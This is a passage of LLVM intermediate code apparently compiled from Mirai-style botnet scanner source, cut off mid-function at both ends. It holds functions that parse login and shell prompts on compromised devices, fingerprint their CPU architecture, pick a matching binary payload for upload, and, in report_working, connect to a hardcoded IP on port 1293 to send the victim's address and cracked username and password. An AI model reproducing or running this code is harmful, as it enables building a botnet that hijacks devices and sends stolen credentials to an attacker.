  store i8 %.sink.1, i8* %18, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %46 = getelementptr inbounds i8, i8* %.03135, i64 2
  %47 = load i8, i8* %46, align 1
  switch i8 %47, label %49 [
    i8 -3, label %48
    i8 -5, label %.sink.split.2
  ]

; <label>:48:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %48, %.preheader.245
  %.sink.2 = phi i8 [ -4, %48 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %46, align 1
  br label %49

; <label>:49:                                     ; preds = %.sink.split.2, %.preheader.245
  %50 = load i32, i32* %9, align 8
  %51 = call i64 @send(i32 %50, i8* nonnull %.03135, i64 3, i32 16384) #9
  %52 = getelementptr inbounds i8, i8* %.03135, i64 3
  %53 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_login_prompt(%struct.scanner_connection*, i32) unnamed_addr #3 {
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %4 = load i32, i32* %3, align 8
  %5 = icmp eq i32 %1, 1
  %6 = sext i32 %4 to i64
  br i1 %5, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %2
  br label %.split

.split.us.preheader:                              ; preds = %2
  br label %.split.us

.split.us:                                        ; preds = %.split.us.preheader, %8
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %6, %.split.us.preheader ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %.us-lcssa.us.loopexit

; <label>:8:                                      ; preds = %.split.us
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %.split.us [
    i8 58, label %.thread.loopexit
    i8 62, label %.thread.loopexit
    i8 36, label %.thread.loopexit
    i8 35, label %.thread.loopexit
    i8 37, label %.thread.loopexit
  ]

.split:                                           ; preds = %.split.preheader, %12
  %indvars.iv38 = phi i64 [ %indvars.iv.next39, %12 ], [ %6, %.split.preheader ]
  %indvars.iv.next39 = add nsw i64 %indvars.iv38, -1
  %11 = icmp sgt i64 %indvars.iv38, 1
  br i1 %11, label %12, label %.us-lcssa.us.loopexit46

; <label>:12:                                     ; preds = %.split
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next39
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.split [
    i8 58, label %.thread.loopexit35
    i8 62, label %.thread.loopexit35
    i8 36, label %.thread.loopexit35
    i8 35, label %.thread.loopexit35
  ]

.us-lcssa.us.loopexit:                            ; preds = %.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit46:                          ; preds = %.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit46, %.us-lcssa.us.loopexit
  %15 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  br i1 %5, label %16, label %26

; <label>:16:                                     ; preds = %.us-lcssa.us
  %17 = tail call i32 @util_memsearch(i8* %15, i32 %4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i64 0, i64 0), i32 4) #9
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %.thread

; <label>:19:                                     ; preds = %16
  %20 = load i32, i32* %3, align 8
  %21 = tail call i32 @util_memsearch(i8* %15, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i64 0, i64 0), i32 5) #9
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %.thread

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %3, align 8
  %25 = tail call i32 @util_memsearch(i8* nonnull %15, i32 %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i64 0, i64 0), i32 3) #9
  br label %.thread

; <label>:26:                                     ; preds = %.us-lcssa.us
  %27 = tail call i32 @util_memsearch(i8* %15, i32 %4, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i64 0, i64 0), i32 7) #9
  br label %.thread

.thread.loopexit:                                 ; preds = %8, %8, %8, %8, %8
  %28 = trunc i64 %indvars.iv to i32
  br label %.thread

.thread.loopexit35:                               ; preds = %12, %12, %12, %12
  %29 = trunc i64 %indvars.iv38 to i32
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit35, %.thread.loopexit, %26, %23, %19, %16
  %.1 = phi i32 [ %17, %16 ], [ %21, %19 ], [ %25, %23 ], [ %27, %26 ], [ %28, %.thread.loopexit ], [ %29, %.thread.loopexit35 ]
  %30 = icmp eq i32 %.1, -1
  %..1 = select i1 %30, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8* nocapture readonly, ...) local_unnamed_addr #3 {
  %3 = alloca [5026 x i8], align 16
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = getelementptr inbounds [5026 x i8], [5026 x i8]* %3, i64 0, i64 0
  %8 = call i32 @vsprintf(i8* nonnull %7, i8* %1, %struct.__va_list_tag* nonnull %5) #9
  call void @llvm.va_end(i8* nonnull %6)
  %9 = sext i32 %8 to i64
  %10 = call i64 @send(i32 %0, i8* nonnull %7, i64 %9, i32 16384) #9
  %11 = icmp eq i64 %10, %9
  br i1 %11, label %12, label %14

; <label>:12:                                     ; preds = %2
  %13 = call i64 @send(i32 %0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #9
  br label %14

; <label>:14:                                     ; preds = %2, %12
  %.0 = phi i32 [ 1, %12 ], [ 0, %2 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_shell_prompt(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %4 = load i32, i32* %3, align 8
  %5 = tail call i32 @util_memsearch(i8* %2, i32 %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i64 0, i64 0), i32 8) #9
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %35

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 8
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %8, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i64 0, i64 0), i32 6) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %35

; <label>:11:                                     ; preds = %7
  %12 = load i32, i32* %3, align 8
  %13 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %12, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i64 0, i64 0), i32 9) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %35

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* %3, align 8
  %17 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %16, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i64 0, i64 0), i32 14) #9
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %35

; <label>:19:                                     ; preds = %15
  %20 = load i32, i32* %3, align 8
  %21 = tail call i32 @util_memsearch(i8* nonnull %2, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i64 0, i64 0), i32 5) #9
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %35

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %3, align 8
  %25 = sext i32 %24 to i64
  br label %26

; <label>:26:                                     ; preds = %28, %23
  %indvars.iv = phi i64 [ %indvars.iv.next, %28 ], [ %25, %23 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %27 = icmp sgt i64 %indvars.iv, 1
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %26
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %30 = load i8, i8* %29, align 1
  %31 = trunc i64 %indvars.iv to i32
  switch i8 %30, label %26 [
    i8 58, label %32
    i8 62, label %32
    i8 36, label %32
    i8 35, label %32
    i8 37, label %32
    i8 93, label %32
    i8 126, label %32
  ]

; <label>:32:                                     ; preds = %28, %28, %28, %28, %28, %28, %28, %26
  %.0 = phi i32 [ -1, %26 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ], [ %31, %28 ]
  %33 = icmp eq i32 %.0, 0
  %..0 = select i1 %33, i32 1, i32 %.0
  %34 = icmp eq i32 %..0, -1
  %...0 = select i1 %34, i32 0, i32 %..0
  ret i32 %...0

; <label>:35:                                     ; preds = %19, %15, %11, %7, %1
  ret i32 -1
}

declare void @table_unlock_val(i8 zeroext) local_unnamed_addr #2

declare i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #2

declare void @table_lock_val(i8 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_resp_prompt(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  %10 = icmp eq i32 %9, -1
  call void @table_lock_val(i8 zeroext 12) #9
  %. = select i1 %10, i32 0, i32 %9
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @parse_elf_response(%struct.scanner_connection*) unnamed_addr #3 {
  br label %2

; <label>:2:                                      ; preds = %50, %1
  %indvars.iv = phi i64 [ 0, %1 ], [ %indvars.iv.next.1, %50 ]
  %.03639 = phi i32 [ 0, %1 ], [ %.1.1, %50 ]
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv
  %4 = load i8, i8* %3, align 1
  %5 = sext i32 %.03639 to i64
  %6 = getelementptr inbounds [5 x i8], [5 x i8]* @.str.131, i64 0, i64 %5
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %4, %7
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %2
  %10 = add nsw i32 %.03639, 1
  %11 = icmp eq i32 %10, 4
  %12 = trunc i64 %indvars.iv to i32
  br i1 %11, label %20, label %13

; <label>:13:                                     ; preds = %2, %9
  %.1 = phi i32 [ %10, %9 ], [ 0, %2 ]
  %indvars.iv.next = or i64 %indvars.iv, 1
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %15 = load i8, i8* %14, align 1
  %16 = sext i32 %.1 to i64
  %17 = getelementptr inbounds [5 x i8], [5 x i8]* @.str.131, i64 0, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = icmp eq i8 %15, %18
  br i1 %19, label %46, label %50

; <label>:20:                                     ; preds = %50, %46, %9
  %.2 = phi i32 [ %12, %9 ], [ %49, %46 ], [ %.1.1, %50 ]
  %21 = icmp eq i32 %.2, 0
  br i1 %21, label %45, label %22

; <label>:22:                                     ; preds = %20
  %23 = add nsw i32 %.2, 2
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 11
  store i8 %26, i8* %27, align 2
  %28 = add nsw i32 %.2, 15
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i16
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  %34 = icmp eq i8 %31, 65
  %. = select i1 %34, i16 8, i16 %32
  store i16 %., i16* %33, align 2
  %35 = icmp eq i16 %., 0
  %36 = icmp eq i8 %26, 0
  %or.cond = or i1 %35, %36
  br i1 %or.cond, label %45, label %37

; <label>:37:                                     ; preds = %22
  switch i16 %., label %thread-pre-split [
    i16 40, label %.thread42
    i16 62, label %38
    i16 8, label %39
    i16 10, label %40
  ]

; <label>:38:                                     ; preds = %37
  br label %.thread42

; <label>:39:                                     ; preds = %37
  switch i8 %26, label %.thread42 [
    i8 2, label %41
    i8 1, label %42
  ]

; <label>:40:                                     ; preds = %37
  switch i8 %26, label %.thread42 [
    i8 2, label %41
    i8 1, label %42
  ]

; <label>:41:                                     ; preds = %40, %39
  store i16 8, i16* %33, align 2
  br label %.thread42

thread-pre-split:                                 ; preds = %37
  br label %.thread42

; <label>:42:                                     ; preds = %40, %39
  store i16 8, i16* %33, align 2
  br label %.thread42

.thread42:                                        ; preds = %40, %39, %thread-pre-split, %37, %41, %42, %38
  %.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i64 0, i64 0), %38 ], [ getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), %41 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i64 0, i64 0), %42 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0), %37 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), %thread-pre-split ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), %39 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), %40 ]
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  %44 = tail call i8* @strcpy(i8* %43, i8* nonnull %.0) #9
  br label %45

; <label>:45:                                     ; preds = %22, %20, %.thread42
  %.035 = phi i32 [ %.2, %.thread42 ], [ 0, %20 ], [ -1, %22 ]
  ret i32 %.035

; <label>:46:                                     ; preds = %13
  %47 = add nsw i32 %.1, 1
  %48 = icmp eq i32 %47, 4
  %49 = trunc i64 %indvars.iv.next to i32
  br i1 %48, label %20, label %50

; <label>:50:                                     ; preds = %46, %13
  %.1.1 = phi i32 [ %47, %46 ], [ 0, %13 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %51 = icmp slt i64 %indvars.iv.next.1, 8192
  br i1 %51, label %2, label %20
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_arm_subtype(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %23, label %11

; <label>:11:                                     ; preds = %1
  %12 = add nsw i32 %9, -1
  %13 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i64 0, i64 0), i32 5) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %18

; <label>:15:                                     ; preds = %11
  %16 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i64 0, i64 0), i32 5) #9
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %15, %11
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i64 0, i64 0), i64 5, i32 1, i1 false)
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  store i16 41, i16* %20, align 2
  br label %23

; <label>:21:                                     ; preds = %15
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %22, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %23

; <label>:23:                                     ; preds = %18, %21, %1
  %.0 = phi i32 [ 0, %1 ], [ %9, %21 ], [ %9, %18 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @report_working(i32, %struct.scanner_connection*, i32) unnamed_addr #3 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @fork() #9
  %6 = icmp sgt i32 %5, 0
  %7 = icmp eq i32 %5, -1
  %or.cond = or i1 %6, %7
  br i1 %or.cond, label %8, label %9

; <label>:8:                                      ; preds = %3
  ret void

; <label>:9:                                      ; preds = %3
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  tail call void @exit(i32 0) #10
  unreachable

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = tail call i32 @htonl(i32 -1335130672) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %15, i32* %16, align 4
  %17 = tail call zeroext i16 @htons(i16 zeroext 1293) #11
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %20 = call i32 @connect(i32 %10, %struct.sockaddr* nonnull %19, i32 16) #9
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %24

; <label>:22:                                     ; preds = %13
  %23 = call i32 @close(i32 %10) #9
  call void @exit(i32 0) #10
  unreachable

; <label>:24:                                     ; preds = %13
  %25 = and i32 %0, 255
  %26 = lshr i32 %0, 8
  %27 = and i32 %26, 255
  %28 = lshr i32 %0, 16
  %29 = and i32 %28, 255
  %30 = lshr i32 %0, 24
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 0
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** %31, align 8
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 0, i32 0
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 0, i32 1
  %36 = load i8*, i8** %35, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 8, i64 0
  %38 = icmp eq i32 %2, 1
  %39 = select i1 %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i64 0, i64 0)
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 1, i32 1
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1, i64 0, i32 9
  %43 = load i8, i8* %42, align 4
  %44 = zext i8 %43 to i32
  %45 = call i32 (i32, i8*, ...) @fdsend(i32 %10, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i64 0, i64 0), i32 %25, i32 %27, i32 %29, i32 %30, i8* %34, i8* %36, i8* %37, i8* %39, i32 %41, i32 %44)
  %46 = call i32 @close(i32 %10) #9
  call void @exit(i32 0) #10
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @connection_consume_upload_methods(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %3 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %21, label %11

; <label>:11:                                     ; preds = %1
  %12 = add nsw i32 %9, -1
  %13 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i64 0, i64 0), i32 10) #9
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %11
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  store i32 1, i32* %16, align 4
  br label %21

; <label>:17:                                     ; preds = %11
  %18 = call i32 @util_memsearch(i8* %4, i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i64 0, i64 0), i32 10) #9
  %19 = icmp ne i32 %18, -1
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  %.sink = select i1 %19, i32 2, i32 0
  store i32 %.sink, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %15, %17, %1
  %.0 = phi i32 [ 0, %1 ], [ %9, %17 ], [ %9, %15 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc %struct.payload* @get_retrieve_binary(%struct.scanner_connection* nocapture readonly) unnamed_addr #8 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 14
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 11
  %4 = load i8, i8* %3, align 2
  %5 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0, i32 0), align 16
  %6 = icmp eq i8 %4, %5
  br i1 %6, label %7, label %13

; <label>:7:                                      ; preds = %1
  %8 = load i16, i16* %2, align 2
  %9 = zext i16 %8 to i32
  %10 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0, i32 1), align 1
  %11 = zext i8 %10 to i32
  %12 = icmp eq i32 %9, %11
  br i1 %12, label %16, label %13

; <label>:13:                                     ; preds = %7, %1
  %14 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1, i32 0), align 8
  %15 = icmp eq i8 %4, %14
  br i1 %15, label %17, label %23

; <label>:16:                                     ; preds = %41, %35, %26, %17, %7
  %.012 = phi %struct.payload* [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 0), %7 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1), %17 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2), %26 ], [ getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3), %35 ], [ null, %41 ]
  ret %struct.payload* %.012

; <label>:17:                                     ; preds = %13
  %18 = load i16, i16* %2, align 2
  %19 = zext i16 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 1, i32 1), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %19, %21
  br i1 %22, label %16, label %23

; <label>:23:                                     ; preds = %17, %13
  %24 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2, i32 0), align 16
  %25 = icmp eq i8 %4, %24
  br i1 %25, label %26, label %32

; <label>:26:                                     ; preds = %23
  %27 = load i16, i16* %2, align 2
  %28 = zext i16 %27 to i32
  %29 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 2, i32 1), align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %28, %30
  br i1 %31, label %16, label %32

; <label>:32:                                     ; preds = %26, %23
  %33 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3, i32 0), align 8
  %34 = icmp eq i8 %4, %33
  br i1 %34, label %35, label %41

; <label>:35:                                     ; preds = %32
  %36 = load i16, i16* %2, align 2
  %37 = zext i16 %36 to i32
  %38 = load i8, i8* getelementptr inbounds ([4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 3, i32 1), align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %37, %39
  br i1 %40, label %16, label %41

; <label>:41:                                     ; preds = %35, %32
  br label %16
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc noalias %struct.binary* @process_retrieve_binary(%struct.payload* nocapture readonly) unnamed_addr #3 {
  %2 = alloca [5 x i8], align 1
  %3 = alloca [256 x i8], align 16
  %4 = getelementptr inbounds [256 x i8], [256 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 256, i32 16, i1 false)
  %5 = getelementptr inbounds %struct.payload, %struct.payload* %0, i64 0, i32 3
  %6 = load i16, i16* %5, align 8
  %div = lshr i16 %6, 6
  %addconv = add nuw nsw i16 %div, 1
  %7 = zext i16 %addconv to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 16) #9
  %9 = bitcast i8* %8 to %struct.binary*
  %10 = zext i16 %addconv to i64
  br label %14

.preheader:                                       ; preds = %14
  %11 = getelementptr inbounds i8, i8* %8, i64 8
  %12 = getelementptr inbounds [5 x i8], [5 x i8]* %2, i64 0, i64 0
  %13 = getelementptr inbounds %struct.payload, %struct.payload* %0, i64 0, i32 2
  br label %18

; <label>:14:                                     ; preds = %1, %14
  %indvars.iv40 = phi i64 [ 0, %1 ], [ %indvars.iv.next41, %14 ]
  %15 = tail call noalias i8* @malloc(i64 256) #9
  %16 = getelementptr inbounds %struct.binary, %struct.binary* %9, i64 %indvars.iv40, i32 0
  store i8* %15, i8** %16, align 8
  %indvars.iv.next41 = add nuw i64 %indvars.iv40, 1
  %17 = icmp slt i64 %indvars.iv.next41, %10
  br i1 %17, label %14, label %.preheader

; <label>:18:                                     ; preds = %.preheader, %43
  %19 = phi i16 [ %6, %.preheader ], [ %.pre, %43 ]
  %indvars.iv38 = phi i64 [ 0, %.preheader ], [ %indvars.iv.next39, %43 ]
  %.026 = phi i32 [ 0, %.preheader ], [ %49, %43 ]
  %20 = icmp eq i16 %19, 0
  br i1 %20, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %18
  %21 = sext i32 %.026 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %27
  %22 = phi i16 [ %19, %.lr.ph.preheader ], [ %35, %27 ]
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %27 ]
  %.132 = phi i32 [ 0, %.lr.ph.preheader ], [ %34, %27 ]
  %23 = add nsw i64 %indvars.iv, %21
  %24 = zext i16 %22 to i64
  %25 = icmp slt i64 %23, %24
  %26 = trunc i64 %indvars.iv to i32
  br i1 %25, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %12, i8 0, i64 5, i32 1, i1 false)
  %28 = load i8*, i8** %13, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 %23
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %12, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i64 0, i64 0), i32 %31)
  %33 = call i8* @strcat(i8* nonnull %4, i8* nonnull %12) #9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %34 = add nuw nsw i32 %.132, 1
  %35 = load i16, i16* %5, align 8
  %36 = zext i16 %35 to i64
  %37 = icmp sge i64 %indvars.iv.next, %36
  %38 = icmp eq i64 %indvars.iv.next, 64
  %or.cond = or i1 %38, %37
